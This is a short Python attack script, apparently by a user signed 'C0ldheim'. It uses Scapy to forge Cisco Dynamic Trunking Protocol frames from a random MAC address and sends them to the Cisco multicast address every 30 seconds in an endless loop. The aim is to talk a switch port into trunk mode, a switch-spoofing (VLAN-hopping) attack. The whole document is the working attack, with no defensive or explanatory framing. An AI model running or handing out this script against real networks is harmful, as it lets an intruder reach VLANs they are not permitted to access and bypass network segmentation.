#by C0ldheim

#import Scapy & DTP
from scapy.all import * 
from scapy.contrib.dtp import *


cisco_multicast = "01:00:0C:CC:CC:CC"



def negotiate_trunk(iface=conf.iface, mymac=str(RandMAC())):
    print ("Trying to negotiate...")
    dtp_frame = Dot3(src=mymac, dst=cisco_multicast)
    dtp_frame /= LLC()/SNAP()
    dtp_frame /= DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),DTPNeighbor(neighbor=mymac)])
    sendp(dtp_frame, inter=30, loop=1) #every 30 sec, we sending the "DESIRABLE" DTP frame.


negotiate_trunk()